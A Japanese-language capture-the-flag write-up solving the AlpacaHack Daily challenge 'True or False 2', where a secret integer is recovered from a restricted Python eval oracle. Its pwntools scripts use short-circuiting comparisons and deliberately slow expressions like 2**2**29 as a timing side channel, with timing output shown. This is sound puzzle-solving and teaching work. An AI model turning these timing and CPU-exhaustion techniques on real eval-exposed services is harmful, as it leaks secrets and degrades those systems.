---
title: "True or False 2 - AlpacaHack Daily"
category: "pwn"
subcategory: "pwn"
type: "writeup"
tags: ["pwn", "alpacahack", "eval", "true", "false", "binary-exploitation"]
summary: "pwn writeup for \"True or False 2\" from AlpacaHack Daily - techniques: alpacahack, eval, true, false, binary-exploitation."
source:
  name: "baumroll0928-spec/myRepository"
  url: "https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202608/d13-15_True_or_False_2/README.md"
ctf:
  name: "AlpacaHack Daily"
  year: 2026
  challenge: "True or False 2"
---

## Source

- **CTF:** AlpacaHack Daily
- **Challenge:** True or False 2
- **Date:** 2026-08-13-15
- **Repository:** [baumroll0928-spec/myRepository](https://github.com/baumroll0928-spec/myRepository)
- **Directory:** <https://github.com/baumroll0928-spec/myRepository/tree/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202608/d13-15_True_or_False_2>
- **File:** <https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202608/d13-15_True_or_False_2/README.md>

---
# True or False 2

## 問題

全ては二元論に通じます。こちらがその難しい方です。

```py
FLAG = "Alpaca{REDACTED}"
MAX_EVALS = 17 # No more ternary search

ALLOWED_CHARS = (
    "0123456789"
    "a"
    "+-*()<>=" # No more division-by-zero errors
)

a = secrets.randbelow(2**44)

for _ in range(MAX_EVALS):
    code = input("Eval > ")

    if any(c not in ALLOWED_CHARS for c in code):
        print("Not allowed")
        continue

    try:
        print(bool(eval(code, {"a": a, "__builtins__": {}})))
    except Exception:
        print("Error")

guess = int(input("Guess > "))

if guess == a:
    print(f"Well done! Here's your flag: {FLAG}")
else:
    print("Wrong")
```

## 概要

7月23日の過去問「True or False」の高難易度版のようです。（前回の「True or False」の解法は [こちら](https://github.com/baumroll0928-spec/myRepository/tree/main/Daily_AlpacaHack/m202607/d23_True_or_False) に記載してあります。）

前回の問題と比較すると、入力に`/`が使えなくなっている上に、質問の回数が28回 → 17回に減らされています。

たったこれだけの変更ですが、やってみるとものすごく厄介であることにすぐ気づくはずです。

まず、`/`が使えないので0除算エラーが起こせません。

もしうまくエラーを起こす方法があったところで、

$`2^{44} = 17592186044416`$

$`3^{17} = 129140163`$

であることから、種類数が全然足りません。

$`6^{17} < 2^{44} < 7^{17}`$

より、前回と同じ方法で行うなら、最低7分割する必要があります。

今回はどうすれば答えを特定できるのでしょうか？

## 方針

条件によって処理するかどうかが決まる重い計算処理を使って、応答時間によってより細かく分岐する。

## 解法

Pythonの`>`等の比較演算子は、重ねて使うことができ、見た目どおりの比較をすることができます。

例えば、
```py
if x > y > z:
    ...
```
のように書くと、「`x`より`y`が小さく、かつ、`y`より`z`が小さい」という条件になります。

※C言語でこのように書くと意図しない判定になってしまうので注意が必要です。ちゃんと`x > y && y > z`と書きましょう。

ここで重要なのが、`x > y`の時点で`False`の場合、その時点で計算が打ち切られ、`z`は評価されることなく全体が`False`になる点です。

例えば、答えの整数`a`の下から`i (0,1,2,...)`番目のビットを`b`で表せたと仮定します。

このとき、

```py
eval("b > 0 > (計算にめっちゃ時間がかかる式)")
```

を計算しようとしたらどうなるでしょうか？

`b`が`0`のときは、`b > 0`が`False`なので、一番右は計算されずに終わります。

しかし、`b`が`1`のときは、`b > 0`が`True`なので、一番右の計算が必要になります。

これを利用すれば、応答時間によって`b`を特定することができます。

具体的にはどんな式にすればいいのでしょうか？

いろいろ試したところ、私のローカルで立ち上げたDockerの環境の実行では、`2**2**29`（2の(2の29乗)乗）としたとき2秒前後稼げてちょうどいい具合でした。

※環境によって調整が必要と思われます。

```py
import pwn
import datetime

HOST, PORT = "localhost", 1337
p = pwn.remote(HOST, PORT)

for i in range(17):
    code = f"{i%2} > 0 > (2**2**29)" # 0と1を交互に送ってみる
    payload = code.replace(" ","").encode() # 空白は使えないので除去する
    p.recvuntil(b'Eval > ')
    dt_start = datetime.datetime.now()
    p.sendline(payload)
    d = p.recvline()
    dt_end = datetime.datetime.now()
    response_time = (dt_end - dt_start).total_seconds()
    print(response_time)
```

```
0.00113
2.006429
0.001005
1.834185
0.0
1.819611
0.001032
1.857996
0.048016
1.921461
0.001
2.089135
0.000504
2.141415
0.002
2.107768
0.001
```

ほぼ0秒と約2秒が交互になっているのがわかります。ここまでは順調です。

さて、`/`も`%`も`&`も使わずにどうやって特定のビットを表せばいいのでしょうか？

私はビットシフト演算子`>>`と`<<`を使ってみました。

非負整数`x`に対して`x>>1`は`x//2`、`x<<1`は`x*2`と同じになります。

これを利用して、`i`だけ右シフトした`a>>i`から、1つ余分にシフトしたあと元に戻すことで最下位ビットを削り取った`a>>(i+1)<<1`を引けば、下から`i`ビット目を求めることができます。

※`<<1`でなく`*2`でもいいですが、`<<`の優先順位が意外と低く`*`や`+`より低いので、`*`を使う場合は注意が必要です。

これらを送って結果が返ってきたときの応答時間（ほぼ0秒 or 約2秒）を、1秒をしきい値にして分断し、2進数を組み立てていきます。

```py
import pwn
import datetime

HOST, PORT = "localhost", 1337
p = pwn.remote(HOST, PORT)

ans = 0
for i in range(17):
    code = f"(a>>{i}) - (a>>{i+1}<<1) > 0 > 2**2**29"
    payload = code.replace(" ","").encode()
    p.recvuntil(b'Eval > ')
    dt_start = datetime.datetime.now()
    p.sendline(payload)
    d = p.recvline()
    dt_end = datetime.datetime.now()
    response_time = (dt_end - dt_start).total_seconds()
    print(response_time)
    if response_time > 1.0:
        ans += 1 << i

print(f"{ans = }")
p.sendlineafter(b'Guess > ', str(ans).encode())
print(p.recvline())
```
```
0.000993
1.985123
...
1.824411
ans = 107514
b'Wrong\n'
```

なにやらそれっぽい値が出てきましたが、もちろんこれだけではダメです。「概要」で述べた通り、最低7分割しないと足りないからです。

そこで、もっと時間がかかる計算と、返ってきた`True`/`False`を利用して、8分割することを考えます。
```py
import pwn
import datetime

HOST, PORT = "localhost", 1337
p = pwn.remote(HOST, PORT)

ans = 0
for i in range(17):
    code = (
        f"( (a>>{i*3}  ) - (a>>{i*3+1}<<1) > 0 > 2**2**29 ) + "
        f"( (a>>{i*3+1}) - (a>>{i*3+2}<<1) > 0 > 2**2**30 ) + "
        f"( (a>>{i*3+2}) - (a>>{i*3+3}<<1) )"
    )
    payload = code.replace(" ","").encode()
    p.recvuntil(b'Eval > ')
    dt_start = datetime.datetime.now()
    p.sendline(payload)
    d = p.recvline()
    dt_end = datetime.datetime.now()
    response_time = (dt_end - dt_start).total_seconds()

    print(f"{i = }")
    print(response_time)
    print(d)

    if response_time < 1.0:
        x = 0
    elif response_time < 3.0:
        x = 1
    elif response_time < 5.0:
        x = 2
    else:
        x = 3
    if d.startswith(b'T'):
        x += 4
    print(f"{x = }")
    ans += x << i * 3
    print("--")

print(f"{ans = }")
p.sendlineafter(b'Guess > ', str(ans).encode())
print(p.recvline())
```

一応簡単に説明しておきます。

ここでは、下から3ビットずつまとめて特定していくことを考えています。

答えの整数`a`は最大44ビットなので、3 × 17 = 51 > 44よりこれで十分です。

まず、
```py
f"( (a>>{i*3}  ) - (a>>{i*3+1}<<1) > 0 > 2**2**29 ) + "
```
の部分は、3ビットのブロックの最下位ビットが1のとき約2秒かかるようにしてあります。

結果はどのみち`False`ですが、`+`で足し合わせることで`0`として扱われるようになります。

次に、
```py
f"( (a>>{i*3+1}) - (a>>{i*3+2}<<1) > 0 > 2**2**30 ) + "
```
の部分で、ブロックの真ん中のビットが1のとき約4秒かかるようにしてあります。

ここまでで、ブロックの下位2ビットが

- 00のとき、ほぼ0秒で終わる
- 01のとき、約2秒かかる
- 10のとき、約4秒かかる
- 11のとき、約6秒かかる

となり、1秒、3秒、5秒をしきい値として0, 1, 2, 3に対応付けすれば、よっぽどのブレがない限りはそれぞれを区別することができます。

最後に、
```py
f"( (a>>{i*3+2}) - (a>>{i*3+3}<<1) )"
```
の部分は、ブロックの最上位ビットをそのまま表しています。

これが0のとき、0+0+0=0により`False`が返り、1のとき0+0+1=1により`True`が返るので、これらも区別することができます。

`True`だった場合は、先ほどの0～3の値に4を加算します。

※実は`... > ... > aa`のようにすると左側の不等号が成立する場合だけ未定義の変数`aa`を評価しようとすることからエラーを起こすこともできるのですが、今回はあまりメリットが無さそうなので使いませんでした。

さっそく実行してみましょう。

```
i = 0
5.83647
b'False\n'
x = 3
--
i = 1
0.001001
b'False\n'
x = 0
--
i = 2
3.937396
b'True\n'
x = 6
--
...
--
i = 16
0.001997
b'False\n'
x = 0
--
ans = 15604380914722
b"Well done! Here's your flag: Alpaca{REDACTED}\n"
```

できました！

続いて同じように本番環境で、といきたいところですが、本番環境で行うには少し調整が必要でした。

※Dockerfileでは`-T60`となっていましたが、10秒あたりで落ちてしまいました。理由はわかりません。

私が本番環境でやったときは、重い計算式のところを`2**2**28`と`2**2**29`のように指数を1つずつ減らすと、応答時間がほぼ0秒、約2.5秒、約5秒、約7.5秒になったので、しきい値を0.125秒、0.375秒、0.625秒に調整したらうまくいきました。
